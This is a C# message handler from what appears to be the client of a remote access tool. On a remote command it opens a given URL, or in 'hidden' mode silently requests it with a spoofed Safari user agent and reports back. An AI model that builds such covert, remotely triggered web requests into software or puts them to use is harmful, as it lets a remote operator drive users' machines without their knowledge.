

using InvokedCommon.Messages;
using InvokedCommon.Networking;
using System;
using System.Diagnostics;
using System.Net;


namespace InvokedClient.MessageHandlers
{
	public class WebsiteVisitorHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => message is DoVisitWebsite;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is DoVisitWebsite message1))
				return;
			this.Execute(sender, message1);
		}

		private void Execute(ISender client, DoVisitWebsite message)
		{
			string str = message.Url;
			if (!str.StartsWith("http"))
				str = "http://" + str;
			if (!Uri.IsWellFormedUriString(str, UriKind.RelativeOrAbsolute))
				return;
			if (!message.Hidden)
			{
				Process.Start(str);
			}
			else
			{
				try
				{
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(str);
					httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
					httpWebRequest.AllowAutoRedirect = true;
					httpWebRequest.Timeout = 10000;
					httpWebRequest.Method = "GET";
					using ((HttpWebResponse)httpWebRequest.GetResponse())
						;
				}
				catch
				{
				}
			}
			client.Send<SetStatus>(new SetStatus()
			{
				Message = "Visited Website"
			});
		}
	}
}
